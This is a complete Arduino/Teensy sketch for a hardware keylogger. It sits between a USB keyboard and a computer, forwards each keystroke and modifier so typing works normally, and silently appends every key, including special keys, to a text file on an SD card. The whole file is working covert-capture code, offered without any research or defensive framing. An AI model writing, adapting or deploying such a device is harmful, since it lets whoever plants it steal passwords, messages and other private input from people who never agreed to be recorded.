#include <USBHost_t36.h>
#include <SD.h>

File dataLog;

USBHost myusb;
KeyboardController keyboard1(myusb);

const int chipSelect = BUILTIN_SDCARD;

void setup(){
  while (!Serial) ; // wait for Arduino Serial Monitor
  myusb.begin();
  keyboard1.attachPress(OnPress);
  keyboard1.attachRelease(OnRelease);  
  if (!SD.begin(chipSelect)) {return;} //restart until SD card found
  dataLog = SD.open("datalog.txt", FILE_WRITE);
}

void loop() {
  myusb.Task();
}

void OnPress(int key){
  //********************* Detect if keys are supported or not ******************//
  if(key==0){
    Serial.println("Unsupported Key, might be prntscrn, key locks, pausebreak, etc.");
    return;
  }
  //**********************  Get Modifiers ***************************//
  short mod = keyboard1.getModifiers();
  String activeMods = "";
  Serial.print("mod: ");
  if(mod==0){
    Serial.println("None");
    //release keys before pressing new key. Modifier keys will be held down until next non-modifier key pressed. OnPress wont trigger unless  
    //  a non-modifier is pressed. For normal typing that is not sensitive to holding modifier keys (such as gaming), those tasks shouldnt 
    //  be negatively affected by it
    Keyboard.release(MODIFIERKEY_RIGHT_GUI); 
    Keyboard.release(MODIFIERKEY_RIGHT_ALT);
    Keyboard.release(MODIFIERKEY_RIGHT_SHIFT);
    Keyboard.release(MODIFIERKEY_RIGHT_CTRL);
    Keyboard.release(MODIFIERKEY_LEFT_GUI);
    Keyboard.release(MODIFIERKEY_LEFT_ALT);
    Keyboard.release(MODIFIERKEY_LEFT_SHIFT);
    Keyboard.release(MODIFIERKEY_LEFT_CTRL);
  }else{
    if(mod>255){ //modifiers should be stored as a byte, so shouldnt ever execute this according to the docs
      Serial.println("Illegal Modifier");
    }
    //Modifiers are stored in a byte as a boolean 1 or 0, with each bit signifying which modifier key was held down. 
    //For example, 0b10010001 would be R-GUI, R-Ctrl, and L-Ctrl
    if(mod>=128){ //0b1xxxxxxx
      activeMods+="R-GUI"; Keyboard.press(MODIFIERKEY_RIGHT_GUI); mod-=128;
    }if(mod>=64){ //0bx1xxxxxx
      activeMods+="R-Alt "; Keyboard.press(MODIFIERKEY_RIGHT_ALT); mod-=64;
    }if(mod>=32){ //0bxx1xxxxx
      activeMods+="R-Shift "; Keyboard.press(MODIFIERKEY_RIGHT_SHIFT); mod-=32;
    }if(mod>=16){ //0bxxx1xxxx
      activeMods+="R-Ctrl "; Keyboard.press(MODIFIERKEY_RIGHT_CTRL); mod-=16;
    }if(mod>=8){ //0bxxxx1xxx
      activeMods+="L-GUI "; Keyboard.press(MODIFIERKEY_LEFT_GUI); mod-=8;
    }if(mod>=4){ //0bxxxxx1xx
      activeMods+="L-Alt "; Keyboard.press(MODIFIERKEY_LEFT_ALT); mod-=4;
    }if(mod>=2){ //0bxxxxxx1x
      activeMods+="L-Shift "; Keyboard.press(MODIFIERKEY_LEFT_SHIFT); mod-=2;
    }if(mod>=1){ //0bxxxxxxx1
      activeMods+="L-Ctrl"; Keyboard.press(MODIFIERKEY_LEFT_CTRL); mod-=1;
    }
    Serial.println(activeMods);
  }
  //************************* Press Keys ****************************//
  if (key >= 1 && key <= 26 && key != 10 && key != 9 ) { //Invalid keys, default to letters, from 1-26, except 9 and 10
    Keyboard.press((char)(key + 96));
    Keyboard.release((char)(key + 96));
  }else{
    //Imitate keystroke
    Keyboard.press(getChar(int(keyboard1.getKey())));
    //log keystroke to SD card
    dataLog = SD.open("datalog.txt", FILE_WRITE);
    switch(int(keyboard1.getKey())){
      case 0:   dataLog.print("「nil」"); break;
      case 8:   dataLog.print("「del」"); break;
      case 9:   dataLog.print("「tab」"); break;
      case 10:  dataLog.print("「enter」"); break;
      case 27:  dataLog.print("「esc」"); break;
      case 31:  dataLog.print("「CtrlBksp」"); break;
      case 32 ... 126: dataLog.print((char)key); break; //regular characters
      case 127: dataLog.print("「bksp」"); break;
      case 194: dataLog.print("「F1」"); break;
      case 195: dataLog.print("「F2」"); break;
      case 196: dataLog.print("「F3」"); break;
      case 197: dataLog.print("「F4」"); break;
      case 198: dataLog.print("「F5」"); break;
      case 199: dataLog.print("「F6」"); break;
      case 200: dataLog.print("「F7」"); break;
      case 201: dataLog.print("「F8」"); break;
      case 202: dataLog.print("「F9」"); break;
      case 203: dataLog.print("「F10」"); break;
      case 204: dataLog.print("「F11」"); break;
      case 205: dataLog.print("「F12」"); break;
      case 209: dataLog.print("「insert」"); break; //numpad
      case 210: dataLog.print("「home」"); break; //numpad
      case 211: dataLog.print("「pgUp」"); break; //numpad
      case 212: dataLog.print("「numDel」"); break; //numpad
      case 213: dataLog.print("「end」"); break; //numpad
      case 214: dataLog.print("「pgdown」");; break; //numpad
      case 215: dataLog.print("「→」"); break; //numpad
      case 216: dataLog.print("「←」"); break; //numpad
      case 217: dataLog.print("「↓」"); break; //numpad
      case 218: dataLog.print("「↑」"); break; //numpad
      default:  dataLog.print("「?〚" + activeMods + "〛" + String(keyboard1.getKey()) + "?」"); break; //usually weird keystrokes
                            //Should show up like: 「?〚R-Ctrl 〛125?」, often from weird keystrokes
    }
  }
  dataLog.close();
  Serial.println("Key: " + String((char)key) + " Key Code: " + String(keyboard1.getKey()) + " Raw key: " + String(key) + "\n");
}

//Release non-modifier key held
void OnRelease(int key){
  Keyboard.release(getChar(key)); 
  short mod = keyboard1.getModifiers();
  //If modifier keys are released before key is let go, release them on key release on a selective basis
  if(mod==0){ //no modifier keys down
    Keyboard.release(MODIFIERKEY_RIGHT_GUI); 
    Keyboard.release(MODIFIERKEY_RIGHT_ALT);
    Keyboard.release(MODIFIERKEY_RIGHT_SHIFT);
    Keyboard.release(MODIFIERKEY_RIGHT_CTRL);
    Keyboard.release(MODIFIERKEY_LEFT_GUI);
    Keyboard.release(MODIFIERKEY_LEFT_ALT);
    Keyboard.release(MODIFIERKEY_LEFT_SHIFT);
    Keyboard.release(MODIFIERKEY_LEFT_CTRL);
  }else{
    if(mod>255){Serial.println("Illegal Modifier");}
    //If a number is less than the modifier key, then the modifier key is not down
    if(mod<128){Keyboard.release(MODIFIERKEY_RIGHT_GUI); mod-=128;}
    if(mod<64){Keyboard.release(MODIFIERKEY_RIGHT_ALT); mod-=64;}
    if(mod<32){Keyboard.release(MODIFIERKEY_RIGHT_SHIFT); mod-=32;}
    if(mod<16){Keyboard.release(MODIFIERKEY_RIGHT_CTRL); mod-=16;}
    if(mod<8){Keyboard.release(MODIFIERKEY_LEFT_GUI); mod-=8;}
    if(mod<4){Keyboard.release(MODIFIERKEY_LEFT_ALT); mod-=4;}
    if(mod<2){Keyboard.release(MODIFIERKEY_LEFT_SHIFT); mod-=2;}
    if(mod<1){ Keyboard.release(MODIFIERKEY_LEFT_CTRL); mod-=1;}    
  }
}

//Sometimes, releasing "(char) key" doesnt work, so an exception table is below
short getChar(int key){ 
  switch(key){
    case 0: return(0); break;
    case 9: return(KEY_TAB); break;
    case 27: return(KEY_ESC); break;
    case 31: return(KEY_BACKSPACE); //ctrl-backspace
    case 128: return(KEY_LEFT_CTRL); break;
    case 129: return(KEY_LEFT_SHIFT); break;
    case 130: return(KEY_LEFT_ALT); break;
    case 131: return(KEY_LEFT_GUI); break;
    case 132: return(KEY_RIGHT_CTRL); break;
    case 133: return(KEY_RIGHT_SHIFT); break;
    case 134: return(KEY_RIGHT_ALT); break;
    case 135: return(KEY_RIGHT_GUI); break;
    case 194: return(KEY_F1); break;
    case 195: return(KEY_F2); break;
    case 196: return(KEY_F3); break;
    case 197: return(KEY_F4); break;
    case 198: return(KEY_F5); break;
    case 199: return(KEY_F6); break;
    case 200: return(KEY_F7); break;
    case 201: return(KEY_F8); break;
    case 202: return(KEY_F9); break;
    case 203: return(KEY_F10); break;
    case 204: return(KEY_F11); break;
    case 205: return(KEY_F12); break;
    case 209: return(KEY_INSERT); break;
    case 210: return(KEY_HOME); break;
    case 211: return(KEY_PAGE_UP); break;
    case 212: return(KEY_DELETE); break;
    case 213: return(KEY_END); break;
    case 214: return(KEY_PAGE_DOWN); break;
    case 215: return(KEY_RIGHT_ARROW); break;
    case 216: return(KEY_LEFT_ARROW); break; 
    case 217: return(KEY_DOWN_ARROW); break;
    case 218: return(KEY_UP_ARROW); break;
    default: return((short)key); //other keys should work normally
  }
}
